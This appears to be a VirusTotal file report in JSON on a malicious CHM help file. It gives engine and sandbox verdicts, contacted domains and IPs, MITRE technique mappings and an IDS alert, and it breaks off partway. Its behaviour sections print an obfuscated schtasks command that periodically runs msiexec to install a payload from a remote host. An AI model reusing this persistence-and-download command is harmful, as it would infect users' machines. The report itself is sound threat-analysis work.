@@ -1,0 +1,1235 @@
+{
+    "analyse": {
+        "data": {
+            "id": "413d0aacddad41105f9f04de12cae9420919083796ed856df47ee2c7b3767fda",
+            "type": "file",
+            "links": {
+                "self": "https://www.virustotal.com/ui/files/413d0aacddad41105f9f04de12cae9420919083796ed856df47ee2c7b3767fda"
+            },
+            "attributes": {
+                "last_modification_date": 1756602121,
+                "sha256": "413d0aacddad41105f9f04de12cae9420919083796ed856df47ee2c7b3767fda",
+                "magika": "CHM",
+                "md5": "0b4aab3d1e2946b15b70a63187c1f927",
+                "trid": [
+                    {
+                        "file_type": "Windows HELP Index",
+                        "probability": 81
+                    }
+                ],
+                "filecondis": {
+                    "raw_md5": "999e765ad16ff343436f7a8c897e8806",
+                    "dhash": "e0e0a08000000000"
+                },
+                "magic": "MS Windows HtmlHelp Data",
+                "sandbox_verdicts": {
+                    "VMRay": {
+                        "category": "malicious",
+                        "sandbox_name": "VMRay",
+                        "malware_classification": [
+                            "MALWARE"
+                        ],
+                        "malware_names": [
+                            "C2/Generic-A"
+                        ]
+                    },
+                    "Zenbox": {
+                        "category": "malicious",
+                        "confidence": 68,
+                        "sandbox_name": "Zenbox",
+                        "malware_classification": [
+                            "MALWARE"
+                        ],
+                        "malware_names": [
+                            "Bitter Elephant"
+                        ]
+                    }
+                },
+                "reputation": -55,
+                "size": 11264,
+                "type_description": "Compiled HTML Help",
+                "total_votes": {
+                    "harmless": 0,
+                    "malicious": 3
+                },
+                "ssdeep": "48:BH/gB09I06QRlEFlErlEl6I5s+BIj9SElv2JlMLFCBkkqGdDHugTae8Bn7pWH8N:BHNIDagi2/oC0iHfae4VWHW",
+                "last_submission_date": 1699575739,
+                "last_analysis_date": 1755997379,
+                "tags": [
+                    "detect-debug-environment"
+                ],
+                "names": [
+                    "413d0aacddad41105f9f04de12cae9420919083796ed856df47ee2c7b3767fda.unknown"
+                ],
+                "meaningful_name": "413d0aacddad41105f9f04de12cae9420919083796ed856df47ee2c7b3767fda.unknown",
+                "sha1": "dd9342faa65376801a26f0a58534c7e4cbffc614",
+                "type_extension": "chm",
+                "popular_threat_classification": {
+                    "suggested_threat_label": "trojan.chmghost/fasjsnoth",
+                    "popular_threat_category": [
+                        {
+                            "value": "trojan",
+                            "count": 13
+                        }
+                    ],
+                    "popular_threat_name": [
+                        {
+                            "value": "chmghost",
+                            "count": 4
+                        }
+                    ]
+                },
+                "unique_sources": 7,
+                "tlsh": "T120323CB0E3818674D3008F36ABC29987B625BC82D528C96B115F771D18B2F0A77B90D7",
+                "type_tags": [
+                    "chm"
+                ],
+                "times_submitted": 7,
+                "last_analysis_stats": {
+                    "malicious": 30,
+                    "suspicious": 0,
+                    "undetected": 32,
+                    "harmless": 0,
+                    "timeout": 0,
+                    "confirmed-timeout": 0,
+                    "failure": 0,
+                    "type-unsupported": 14
+                },
+                "first_seen_itw_date": 1693822752,
+                "crowdsourced_ids_stats": {
+                    "high": 0,
+                    "info": 1,
+                    "medium": 0,
+                    "low": 0
+                },
+                "first_submission_date": 1693800474,
+                "last_analysis_results": {
+                    "Bkav": {
+                        "method": "blacklist",
+                        "engine_name": "Bkav",
+                        "engine_version": "2.0.0.1",
+                        "engine_update": "20250823",
+                        "category": "undetected",
+                        "result": null
+                    },
+                    "Lionic": {
+                        "method": "blacklist",
+                        "engine_name": "Lionic",
+                        "engine_version": "8.16",
+                        "engine_update": "20250823",
+                        "category": "malicious",
+                        "result": "Trojan.HTML.ChmGhost.a!c"
+                    },
+                    "MicroWorld-eScan": {
+                        "method": "blacklist",
+                        "engine_name": "MicroWorld-eScan",
+                        "engine_version": "14.0.409.0",
+                        "engine_update": "20250823",
+                        "category": "malicious",
+                        "result": "Generic.Agent.CHM.1.489D76A5"
+                    },
+                    "👉 ... (73 more keys omitted)": "..."
+                },
+                "type_tag": "chm",
+                "crowdsourced_ids_results": [
+                    {
+                        "rule_category": "Potential Corporate Privacy Violation",
+                        "alert_severity": "info",
+                        "rule_msg": "ET HUNTING Suspicious Windows Installer UA for non-MSI",
+                        "rule_raw": "alert http $HOME_NET any -> $EXTERNAL_NET any (msg:\"ET HUNTING Suspicious Windows Installer UA for non-MSI\"; flow:established,to_server; http.method; ... (truncated, total len: 664)",
+                        "rule_references": [
+                            "https://www.virustotal.com/gui/search/8000f557f5e8e256b6bd66c82e02aced"
+                        ],
+                        "alert_context": [
+                            {
+                                "url": "http://dashonlineclub.com/CVBN/mzx.php?pi=DESKTOP-B0T93D6$*DESKTOP-B0T93D6",
+                                "hostname": "dashonlineclub.com",
+                                "dest_ip": "82.221.129.39",
+                                "dest_port": 80
+                            }
+                        ],
+                        "rule_url": "https://rules.emergingthreats.net/",
+                        "rule_source": "Proofpoint Emerging Threats Open",
+                        "rule_id": "1:2038809"
+                    }
+                ]
+            }
+        }
+    },
+    "contacted_urls": {
+        "data": [
+            {
+                "id": "707599aca09e7fe9b74fe6bde14c09461e14ba2b77a5c9913c9b2ab1b3e3aaf1",
+                "type": "url",
+                "links": {
+                    "self": "https://www.virustotal.com/ui/urls/707599aca09e7fe9b74fe6bde14c09461e14ba2b77a5c9913c9b2ab1b3e3aaf1"
+                },
+                "attributes": {
+                    "last_analysis_results": {
+                        "Bkav": {
+                            "method": "blacklist",
+                            "engine_name": "Bkav",
+                            "category": "undetected",
+                            "result": "unrated"
+                        },
+                        "CMC Threat Intelligence": {
+                            "method": "blacklist",
+                            "engine_name": "CMC Threat Intelligence",
+                            "category": "harmless",
+                            "result": "clean"
+                        },
+                        "0xSI_f33d": {
+                            "method": "blacklist",
+                            "engine_name": "0xSI_f33d",
+                            "category": "undetected",
+                            "result": "unrated"
+                        },
+                        "👉 ... (87 more keys omitted)": "..."
+                    },
+                    "last_http_response_code": 200,
+                    "reputation": 0,
+                    "threat_names": [],
+                    "first_submission_date": 1693800876,
+                    "last_http_response_headers": {
+                        "content-length": "0",
+                        "content-disposition": "attachment; filename=\"update.msi\"",
+                        "expires": "0",
+                        "Keep-Alive": "timeout=5, max=100",
+                        "server": "LiteSpeed",
+                        "Connection": "Keep-Alive",
+                        "content-description": "File Transfer",
+                        "pragma": "public",
+                        "cache-control": "must-revalidate",
+                        "date": "Mon, 04 Sep 2023 04:19:48 GMT",
+                        "content-type": "application/octet-stream"
+                    },
+                    "url": "http://dashonlineclub.com/CVBN/mzx.php?pi=DESKTOP-B0T93D6$*DESKTOP-B0T93D6",
+                    "last_analysis_date": 1693800876,
+                    "last_analysis_stats": {
+                        "malicious": 0,
+                        "suspicious": 0,
+                        "undetected": 19,
+                        "harmless": 71,
+                        "timeout": 0
+                    },
+                    "tld": "com",
+                    "last_submission_date": 1693800876,
+                    "last_final_url": "http://dashonlineclub.com/CVBN/mzx.php?pi=DESKTOP-B0T93D6$*DESKTOP-B0T93D6",
+                    "total_votes": {
+                        "harmless": 0,
+                        "malicious": 0
+                    },
+                    "tags": [],
+                    "times_submitted": 1,
+                    "categories": {
+                        "Forcepoint ThreatSeeker": "dynamic content"
+                    },
+                    "last_modification_date": 1693801199
+                },
+                "context_attributes": {
+                    "url": "http://dashonlineclub.com/CVBN/mzx.php?pi=DESKTOP-B0T93D6$*DESKTOP-B0T93D6"
+                }
+            }
+        ],
+        "meta": {
+            "count": 2
+        },
+        "links": {
+            "self": "https://www.virustotal.com/ui/files/413d0aacddad41105f9f04de12cae9420919083796ed856df47ee2c7b3767fda/contacted_urls?limit=10"
+        }
+    },
+    "contacted_domains": {
+        "data": [
+            {
+                "id": "dashonlineclub.com",
+                "type": "domain",
+                "links": {
+                    "self": "https://www.virustotal.com/ui/domains/dashonlineclub.com"
+                },
+                "attributes": {
+                    "last_analysis_results": {
+                        "Acronis": {
+                            "method": "blacklist",
+                            "engine_name": "Acronis",
+                            "category": "harmless",
+                            "result": "clean"
+                        },
+                        "0xSI_f33d": {
+                            "method": "blacklist",
+                            "engine_name": "0xSI_f33d",
+                            "category": "undetected",
+                            "result": "unrated"
+                        },
+                        "Abusix": {
+                            "method": "blacklist",
+                            "engine_name": "Abusix",
+                            "category": "harmless",
+                            "result": "clean"
+                        },
+                        "👉 ... (92 more keys omitted)": "..."
+                    },
+                    "whois_date": 1723222611,
+                    "last_modification_date": 1765721427,
+                    "tags": [],
+                    "last_update_date": 1721032822,
+                    "last_https_certificate_date": 1702890388,
+                    "last_dns_records_date": 1702890388,
+                    "popularity_ranks": {},
+                    "creation_date": 1685944395,
+                    "expiration_date": 1717566795,
+                    "registrar": "Internet Domain Service BS Corp",
+                    "last_analysis_stats": {
+                        "malicious": 12,
+                        "suspicious": 0,
+                        "undetected": 34,
+                        "harmless": 49,
+                        "timeout": 0
+                    },
+                    "last_https_certificate": {
+                        "public_key": {
+                            "rsa": {
+                                "key_size": 2048,
+                                "modulus": "ba3a77e70e0704a24e4ad5d00dd0a61abebf63362e2027c9cb33b364176912473dbd27a7b503ae79179d789d267612e3d00f71e8b9e95e593714f66e39601a20c35e17edd63728778eb8a5... (truncated, total len: 512)",
+                                "exponent": "10001"
+                            },
+                            "algorithm": "RSA"
+                        },
+                        "thumbprint_sha256": "518e398931c1c0b15507bdf6a4c0dc66b4baa4fd9511af6b895c835d571cf92d",
+                        "thumbprint": "bd6a0c804983741b7dda96c3bec17a32f0efe4b8",
+                        "subject": {
+                            "CN": "dashonlineclub.com"
+                        },
+                        "validity": {
+                            "not_after": "2024-03-04 05:43:12",
+                            "not_before": "2023-12-05 05:43:13"
+                        },
+                        "version": "V3",
+                        "extensions": {
+                            "certificate_policies": [
+                                "2.23.140.1.2.1"
+                            ],
+                            "extended_key_usage": [
+                                "serverAuth"
+                            ],
+                            "authority_key_identifier": {
+                                "keyid": "142eb317b75856cbae500940e61faf9d8b14c2c6"
+                            },
+                            "subject_alternative_name": [
+                                "*.dashonlineclub.com"
+                            ],
+                            "subject_key_identifier": "5dd1b9f274bc85119a534e43fa6871b4cbc6de11",
+                            "key_usage": [
+                                "digitalSignature"
+                            ],
+                            "1.3.6.1.4.1.11129.2.4.2": "0481f100ef0076003b5377753e2db9804e8b305b06fe403b67d84fc3f4c7bd00",
+                            "CA": false,
+                            "ca_information_access": {
+                                "CA Issuers": "http://r3.i.lencr.org/",
+                                "OCSP": "http://r3.o.lencr.org"
+                            }
+                        },
+                        "cert_signature": {
+                            "signature": "a7ad94d9d5524d800cae5e28e3b90a1fb8d0a48e8b6dada39c38ff4a54cec4fb84705a744b8cf850bdd539a7d6c8e616a266ae28f44d97243a98cf25a33c037c5ae467cfd340b50d1eb2e2... (truncated, total len: 512)",
+                            "signature_algorithm": "sha256RSA"
+                        },
+                        "serial_number": "38faeef629873df9417388015c8e0bcb8f7",
+                        "issuer": {
+                            "C": "US",
+                            "CN": "R3",
+                            "O": "Let's Encrypt"
+                        },
+                        "size": 1290
+                    },
+                    "last_dns_records": [
+                        {
+                            "priority": 30,
+                            "type": "MX",
+                            "value": "mx3.sf.ice-networks.com",
+                            "ttl": 900
+                        }
+                    ],
+                    "whois": "Creation Date: 2023-06-05T05:53:15Z\nDNSSEC: unsigned\nDomain Name: DASHONLINECLUB.COM\nDomain Status: clientTransferProhibited https://icann.org/epp#cli... (truncated, total len: 666)",
+                    "categories": {},
+                    "jarm": "2ad2ad0002ad2ad00042d43d00041d598ac0c1012db967bb1ad0ff2491b3ae",
+                    "total_votes": {
+                        "harmless": 0,
+                        "malicious": 0
+                    },
+                    "tld": "com",
+                    "last_analysis_date": 1765706912,
+                    "reputation": 0
+                }
+            }
+        ],
+        "meta": {
+            "count": 3
+        },
+        "links": {
+            "self": "https://www.virustotal.com/ui/files/413d0aacddad41105f9f04de12cae9420919083796ed856df47ee2c7b3767fda/contacted_domains?limit=10"
+        }
+    },
+    "contacted_ips": {
+        "data": [
+            {
+                "id": "152.199.19.161",
+                "type": "ip_address",
+                "links": {
+                    "self": "https://www.virustotal.com/ui/ip_addresses/152.199.19.161"
+                },
+                "attributes": {
+                    "last_analysis_stats": {
+                        "malicious": 0,
+                        "suspicious": 0,
+                        "undetected": 33,
+                        "harmless": 62,
+                        "timeout": 0
+                    },
+                    "last_analysis_date": 1766517362,
+                    "network": "152.199.0.0/17",
+                    "last_analysis_results": {
+                        "Acronis": {
+                            "method": "blacklist",
+                            "engine_name": "Acronis",
+                            "category": "harmless",
+                            "result": "clean"
+                        },
+                        "0xSI_f33d": {
+                            "method": "blacklist",
+                            "engine_name": "0xSI_f33d",
+                            "category": "undetected",
+                            "result": "unrated"
+                        },
+                        "Abusix": {
+                            "method": "blacklist",
+                            "engine_name": "Abusix",
+                            "category": "harmless",
+                            "result": "clean"
+                        },
+                        "👉 ... (92 more keys omitted)": "..."
+                    },
+                    "continent": "NA",
+                    "rdap": {
+                        "object_class_name": "ip network",
+                        "handle": "NET-152-199-0-0-1",
+                        "start_address": "152.199.0.0",
+                        "end_address": "152.199.255.255",
+                        "ip_version": "v4",
+                        "name": "VZ",
+                        "type": "ASSIGNMENT",
+                        "parent_handle": "NET-152-176-0-0-1",
+                        "status": [
+                            "active"
+                        ],
+                        "links": [
+                            {
+                                "href": "https://rdap.arin.net/registry/ip/152.199.0.0",
+                                "rel": "self",
+                                "type": "application/rdap+json",
+                                "value": "https://rdap.arin.net/registry/ip/152.199.19.161",
+                                "title": "",
+                                "media": "",
+                                "href_lang": []
+                            }
+                        ],
+                        "notices": [
+                            {
+                                "title": "Terms of Service",
+                                "description": [
+                                    "By using the ARIN RDAP/Whois service, you are agreeing to the RDAP/Whois Terms of Use"
+                                ],
+                                "links": [
+                                    {
+                                        "href": "https://www.arin.net/resources/registry/whois/tou/",
+                                        "rel": "terms-of-service",
+                                        "type": "text/html",
+                                        "value": "https://rdap.arin.net/registry/ip/152.199.19.161",
+                                        "title": "",
+                                        "media": "",
+                                        "href_lang": []
+                                    }
+                                ],
+                                "type": ""
+                            }
+                        ],
+                        "events": [
+                            {
+                                "event_action": "last changed",
+                                "event_date": "2022-12-15T11:26:31-05:00",
+                                "event_actor": "",
+                                "links": []
+                            }
+                        ],
+                        "rdap_conformance": [
+                            "nro_rdap_profile_0"
+                        ],
+                        "entities": [
+                            {
+                                "object_class_name": "entity",
+                                "handle": "EDGEC-25",
+                                "vcard_array": [
+                                    {
+                                        "name": "version",
+                                        "type": "text",
+                                        "values": [
+                                            "4.0"
+                                        ],
+                                        "parameters": {}
+                                    }
+                                ],
+                                "roles": [
+                                    "registrant"
+                                ],
+                                "entities": [
+                                    {
+                                        "object_class_name": "entity",
+                                        "handle": "RICHA1018-ARIN",
+                                        "vcard_array": [
+                                            {
+                                                "name": "version",
+                                                "type": "text",
+                                                "values": [
+                                                    "4.0"
+                                                ],
+                                                "parameters": {}
+                                            }
+                                        ],
+                                        "roles": [
+                                            "technical"
+                                        ],
+                                        "links": [
+                                            {
+                                                "href": "https://rdap.arin.net/registry/entity/RICHA1018-ARIN",
+                                                "rel": "self",
+                                                "type": "application/rdap+json",
+                                                "value": "https://rdap.arin.net/registry/ip/152.199.19.161",
+                                                "title": "",
+                                                "media": "",
+                                                "href_lang": []
+                                            }
+                                        ],
+                                        "events": [
+                                            {
+                                                "event_action": "last changed",
+                                                "event_date": "2025-06-12T11:43:24-04:00",
+                                                "event_actor": "",
+                                                "links": []
+                                            }
+                                        ],
+                                        "status": [
+                                            "validated"
+                                        ],
+                                        "port43": "whois.arin.net",
+                                        "public_ids": [],
+                                        "entities": [],
+                                        "remarks": [],
+                                        "as_event_actor": [],
+                                        "networks": [],
+                                        "autnums": [],
+                                        "url": "",
+                                        "lang": "",
+                                        "rdap_conformance": []
+                                    }
+                                ],
+                                "links": [
+                                    {
+                                        "href": "https://rdap.arin.net/registry/entity/EDGEC-25",
+                                        "rel": "self",
+                                        "type": "application/rdap+json",
+                                        "value": "https://rdap.arin.net/registry/ip/152.199.19.161",
+                                        "title": "",
+                                        "media": "",
+                                        "href_lang": []
+                                    }
+                                ],
+                                "events": [
+                                    {
+                                        "event_action": "last changed",
+                                        "event_date": "2025-06-12T11:37:04-04:00",
+                                        "event_actor": "",
+                                        "links": []
+                                    }
+                                ],
+                                "port43": "whois.arin.net",
+                                "public_ids": [],
+                                "remarks": [],
+                                "as_event_actor": [],
+                                "status": [],
+                                "networks": [],
+                                "autnums": [],
+                                "url": "",
+                                "lang": "",
+                                "rdap_conformance": []
+                            }
+                        ],
+                        "port43": "whois.arin.net",
+                        "cidr0_cidrs": [
+                            {
+                                "v4prefix": "152.199.0.0",
+                                "length": 16,
+                                "v6prefix": ""
+                            }
+                        ],
+                        "country": "",
+                        "arin_originas0_originautnums": [],
+                        "remarks": []
+                    },
+                    "last_modification_date": 1766517702,
+                    "jarm": "2ad2ad09d2ad2ad00042d42d00000049d8801e4f5e9656b954b3b1ca4a680b",
+                    "country": "US",
+                    "last_https_certificate_date": 1738617172,
+                    "asn": 701,
+                    "reputation": -7,
+                    "whois_date": 1765300515,
+                    "as_owner": "UUNET",
+                    "whois": "Socket not responding: [Errno 111] Connection refused",
+                    "crowdsourced_context": [
+                        {
+                            "timestamp": 1669888897,
+                            "details": "Source: IT-Dienstleister",
+                            "severity": "low",
+                            "title": "Mixed IOCs, Week 48",
+                            "source": "ArcSight Threat Intelligence"
+                        }
+                    ],
+                    "last_https_certificate": {
+                        "cert_signature": {
+                            "signature_algorithm": "sha256RSA",
+                            "signature": "24395e5baba0c2329043178c99e9f89824fd15a9cf681adfc90fd5ac71fe5476302d9513030d99ef9b34d5b37c2e56451d854da9600a0d4e70f01bb843811c800f0eb0d10e19217939ce56... (truncated, total len: 512)"
+                        },
+                        "extensions": {
+                            "authority_key_identifier": {
+                                "keyid": "0f80611c823161d52f28e78d4638b42ce1c6d9e2"
+                            },
+                            "subject_key_identifier": "c53488d90726a30f1fc3ae81eb8e030c56e7999e",
+                            "subject_alternative_name": [
+                                "*.vo.msecnd.net"
+                            ],
+                            "certificate_policies": [
+                                "2.23.140.1.2.2"
+                            ],
+                            "key_usage": [
+                                "digitalSignature"
+                            ],
+                            "extended_key_usage": [
+                                "serverAuth"
+                            ],
+                            "crl_distribution_points": [
+                                "http://crl3.digicert.com/DigicertSHA2SecureServerCA-1.crl"
+                            ],
+                            "ca_information_access": {
+                                "OCSP": "http://ocsp.digicert.com",
+                                "CA Issuers": "http://cacerts.digicert.com/DigiCertSHA2SecureServerCA-2.crt"
+                            },
+                            "CA": false,
+                            "1.3.6.1.4.1.11129.2.4.2": "048201680166007500cf1156eed52e7caff3875bd9692e9be91a71674ab017ec"
+                        },
+                        "validity": {
+                            "not_after": "2025-06-06 23:59:59",
+                            "not_before": "2024-06-06 00:00:00"
+                        },
+                        "size": 4113,
+                        "version": "V3",
+                        "public_key": {
+                            "algorithm": "RSA",
+                            "rsa": {
+                                "modulus": "eee96726166bea4fe5c69e398e6a1f90e664dc5035f3b33761c34b45c90b17c48a4b6133f24f6f808cfacab96fb8e3e54ce5d57594930e03d13df51293bf369b2ea12bf451291400570b12... (truncated, total len: 512)",
+                                "exponent": "10001",
+                                "key_size": 2048
+                            }
+                        },
+                        "thumbprint_sha256": "8a1c69381400e45ef7c94225cbbbba8925b7b1ef0ebb4ba7661e3aa76dc872b2",
+                        "thumbprint": "fa89aa1deda82bc5069427df7821413c1f47d354",
+                        "serial_number": "3995d7c49cce33e588ea305d01db82a",
+                        "issuer": {
+                            "C": "US",
+                            "O": "DigiCert Inc",
+                            "CN": "DigiCert SHA2 Secure Server CA"
+                        },
+                        "subject": {
+                            "C": "US",
+                            "ST": "Washington",
+                            "L": "Redmond",
+                            "O": "Microsoft Corporation",
+                            "CN": "*.vo.msecnd.net"
+                        }
+                    },
+                    "total_votes": {
+                        "harmless": 1,
+                        "malicious": 8
+                    },
+                    "regional_internet_registry": "ARIN",
+                    "tags": []
+                }
+            }
+        ],
+        "meta": {
+            "count": 8
+        },
+        "links": {
+            "self": "https://www.virustotal.com/ui/files/413d0aacddad41105f9f04de12cae9420919083796ed856df47ee2c7b3767fda/contacted_ips?limit=10"
+        }
+    },
+    "behaviour": {
+        "data": {
+            "CAPE Sandbox": {
+                "tactics": [
+                    {
+                        "id": "TA0002",
+                        "name": "Execution",
+                        "link": "https://attack.mitre.org/tactics/TA0002/",
+                        "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote... (truncated, total len: 438)",
+                        "techniques": [
+                            {
+                                "id": "T1053",
+                                "name": "Scheduled Task/Job",
+                                "link": "https://attack.mitre.org/techniques/T1053/",
+                                "description": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major o... (truncated, total len: 955)",
+                                "signatures": [
+                                    {
+                                        "severity": "UNKNOWN",
+                                        "description": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code."
+                                    }
+                                ]
+                            }
+                        ]
+                    }
+                ]
+            },
+            "VMRay": {
+                "tactics": [
+                    {
+                        "id": "TA0007",
+                        "name": "Discovery",
+                        "link": "https://attack.mitre.org/tactics/TA0007/",
+                        "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and ... (truncated, total len: 546)",
+                        "techniques": [
+                            {
+                                "id": "T1049",
+                                "name": "System Network Connections Discovery",
+                                "link": "https://attack.mitre.org/techniques/T1049/",
+                                "description": "Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems ... (truncated, total len: 1396)",
+                                "signatures": [
+                                    {
+                                        "severity": "LOW",
+                                        "description": "(Process #1) hh.exe checks network connectivity via API InternetGetConnectedState."
+                                    }
+                                ]
+                            }
+                        ]
+                    }
+                ]
+            },
+            "Zenbox": {
+                "tactics": [
+                    {
+                        "id": "TA0002",
+                        "name": "Execution",
+                        "link": "https://attack.mitre.org/tactics/TA0002/",
+                        "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote... (truncated, total len: 438)",
+                        "techniques": [
+                            {
+                                "id": "T1059",
+                                "name": "Command and Scripting Interpreter",
+                                "link": "https://attack.mitre.org/techniques/T1059/",
+                                "description": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of intera... (truncated, total len: 1054)",
+                                "signatures": [
+                                    {
+                                        "severity": "LOW",
+                                        "description": "Obfuscated command line found",
+                                        "match_data": [
+                                            "C:\\Windows\\System32\\schtasks.exe \"C:\\Windows\\System32\\schtasks.exe\" /create /sc minute /mo 15 /tn GoogleService /tr \"%coMSPec% /c s^ta^rt /^m^i^n m^s^... (truncated, total len: 200)"
+                                        ]
+                                    }
+                                ]
+                            }
+                        ]
+                    }
+                ]
+            }
+        },
+        "links": {
+            "self": "https://www.virustotal.com/ui/files/413d0aacddad41105f9f04de12cae9420919083796ed856df47ee2c7b3767fda/behaviour_mitre_trees"
+        }
+    },
+    "file_behaviour": {
+        "data": [
+            {
+                "id": "413d0aacddad41105f9f04de12cae9420919083796ed856df47ee2c7b3767fda_CAPE Sandbox",
+                "type": "file_behaviour",
+                "links": {
+                    "self": "https://www.virustotal.com/ui/file_behaviours/413d0aacddad41105f9f04de12cae9420919083796ed856df47ee2c7b3767fda_CAPE Sandbox"
+                },
+                "attributes": {
+                    "registry_keys_set": [
+                        {
+                            "value": "0",
+                            "key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\UNCAsIntranet"
+                        }
+                    ],
+                    "mitre_attack_techniques": [
+                        {
+                            "signature_description": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code.",
+                            "id": "T1053.005"
+                        }
+                    ],
+                    "behash": "b82f12dbb9a70d4e738b0886a5618497",
+                    "modules_loaded": [
+                        "HHCTRL.OCX"
+                    ],
+                    "calls_highlighted": [
+                        "doWinMain"
+                    ],
+                    "registry_keys_deleted": [
+                        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProxyBypass"
+                    ],
+                    "has_evtx": false,
+                    "analysis_date": 1693807883,
+                    "command_executions": [
+                        "schtasks /create /sc minute /mo 15 /tn GoogleService /tr \"%coMSPec% /c s^ta^rt /^m^i^n m^s^i^e^xe^c ^/^i  h^tt^p://da^sh^o^nl^in^e^c^l^u^b.^c^o^m/C^V^... (truncated, total len: 219)"
+                    ],
+                    "has_pcap": false,
+                    "sandbox_name": "CAPE Sandbox",
+                    "has_memdump": false,
+                    "ip_traffic": [
+                        {
+                            "transport_layer_protocol": "TCP",
+                            "destination_ip": "69.164.0.0",
+                            "destination_port": 80
+                        }
+                    ],
+                    "mutexes_created": [
+                        "Local\\ZonesCacheCounterMutex"
+                    ],
+                    "processes_tree": [
+                        {
+                            "process_id": "2012",
+                            "name": "\"C:\\Windows\\hh.exe\" \"C:\\Users\\<USER>\\AppData\\Local\\Temp\\tmpdkptqnkb.chm\"",
+                            "children": [
+                                {
+                                    "process_id": "1064",
+                                    "name": "\"C:\\Windows\\System32\\schtasks.exe\" /create /sc minute /mo 15 /tn GoogleService /tr \"%coMSPec% /c s^ta^rt /^m^i^n m^s^i^e^xe^c ^/^i  h^tt^p://da^sh^o^n... (truncated, total len: 245)"
+                                }
+                            ]
+                        }
+                    ],
+                    "registry_keys_opened": [
+                        "HKLM\\Software\\Policies\\Microsoft\\Windows\\System"
+                    ],
+                    "has_html_report": true,
+                    "last_modification_date": 1701697774
+                }
+            }
+        ],
+        "meta": {
+            "count": 3
+        },
+        "links": {
+            "self": "https://www.virustotal.com/ui/files/413d0aacddad41105f9f04de12cae9420919083796ed856df47ee2c7b3767fda/behaviours?limit=40"
+        }
+    },
+    "comments": {
+        "data": [
+            {
+                "id": "f-413d0aacddad41105f9f04de12cae9420919083796ed856df47ee2c7b3767fda-30240012",
+                "type": "comment",
+                "links": {
+                    "self": "https://www.virustotal.com/ui/comments/f-413d0aacddad41105f9f04de12cae9420919083796ed856df47ee2c7b3767fda-30240012"
+                },
+                "attributes": {
+                    "votes": {
+                        "positive": 0,
+                        "negative": 0,
+                        "abuse": 0
+                    },
+                    "tags": [],
+                    "html": "File present on vx-underground.org | virus.exchange.",
+                    "text": "File present on vx-underground.org | virus.exchange.",
+                    "date": 1730017633
+                },
+                "relationships": {
+                    "item": {
+                        "links": {
+                            "self": "https://www.virustotal.com/ui/comments/f-413d0aacddad41105f9f04de12cae9420919083796ed856df47ee2c7b3767fda-30240012/relationships/item",
+                            "related": "https://www.virustotal.com/ui/comments/f-413d0aacddad41105f9f04de12cae9420919083796ed856df47ee2c7b3767fda-30240012/item"
+                        },
+                        "meta": {
+                            "count": 1
+                        },
+                        "data": {
+                            "type": "file",
+                            "id": "413d0aacddad41105f9f04de12cae9420919083796ed856df47ee2c7b3767fda"
+                        }
+                    },
+                    "author": {
+                        "links": {
+                            "self": "https://www.virustotal.com/ui/comments/f-413d0aacddad41105f9f04de12cae9420919083796ed856df47ee2c7b3767fda-30240012/relationships/author",
+                            "related": "https://www.virustotal.com/ui/comments/f-413d0aacddad41105f9f04de12cae9420919083796ed856df47ee2c7b3767fda-30240012/author"
+                        },
+                        "meta": {
+                            "count": 1
+                        },
+                        "data": {
+                            "type": "user",
+                            "id": "vxunderground_0"
+                        }
+                    }
+                }
+            }
+        ],
+        "meta": {
+            "count": 5
+        },
+        "links": {
+            "self": "https://www.virustotal.com/ui/files/413d0aacddad41105f9f04de12cae9420919083796ed856df47ee2c7b3767fda/comments?limit=10&relationships=item%2Cauthor"
+        }
+    },
+    "behaviour_mbc_trees": {
+        "error": "Not Found",
+        "status": 404
+    },
+    "execution_parents": {
+        "data": [
+            {
+                "id": "5695a75d96e56497ab5f7175d5c1da59a4565df668cb89db774eefbb5bfb6cf5",
+                "type": "file",
+                "links": {
+                    "self": "https://www.virustotal.com/ui/files/5695a75d96e56497ab5f7175d5c1da59a4565df668cb89db774eefbb5bfb6cf5"
+                },
+                "attributes": {
+                    "meaningful_name": "2023-09-04.zip",
+                    "filecondis": {
+                        "raw_md5": "bc6772159f5d9a010791a4f916bc5f18",
+                        "dhash": "000000000e0d0a00"
+                    },
+                    "last_modification_date": 1744416521,
+                    "sandbox_verdicts": {
+                        "Zenbox": {
+                            "category": "malicious",
+                            "malware_classification": [
+                                "MALWARE"
+                            ],
+                            "sandbox_name": "Zenbox",
+                            "malware_names": [
+                                "AgentTesla"
+                            ],
+                            "confidence": 100
+                        },
+                        "Zenbox Linux": {
+                            "category": "harmless",
+                            "malware_classification": [
+                                "CLEAN"
+                            ],
+                            "sandbox_name": "Zenbox Linux",
+                            "confidence": 99
+                        }
+                    },
+                    "names": [
+                        "2023-09-04.zip"
+                    ],
+                    "type_tag": "zip",
+                    "tlsh": "T11AE833F8C0B53C38E89588BBB1003D28521552DB753EEAA793FB99C1363F0E6D452966",
+                    "last_submission_date": 1716514299,
+                    "crowdsourced_ids_stats": {
+                        "high": 0,
+                        "medium": 1,
+                        "low": 3,
+                        "info": 0
+                    },
+                    "reputation": -9,
+                    "sigma_analysis_results": [
+                        {
+                            "rule_level": "critical",
+                            "rule_id": "90af0ea1f6d871f169dfb41b18545bf456f980c5d75f60f1293c34f071f6a31c",
+                            "rule_source": "Joe Security Rule Set (GitHub)",
+                            "rule_title": "Scheduled temp file as task from temp location",
+                            "rule_description": "Scheduled temp file as task from temp location",
+                            "rule_author": "Joe Security",
+                            "match_context": [
+                                {
+                                    "values": {
+                                        "Hashes": "SHA1=BBE6394229CE3A53ECCD2CB4CEA6EE41134EFDA9,MD5=15FF7D8324231381BAD48A052F85DF04,SHA256=7949EDDF437FED5F45564402B26E4D457EA666D1361A7C4F07D830BE233A... (truncated, total len: 195)",
+                                        "CurrentDirectory": "C:\\Users\\george\\Desktop\\",
+                                        "OriginalFileName": "schtasks.exe",
+                                        "Product": "Microsoft\\xae Windows\\xae Operating System",
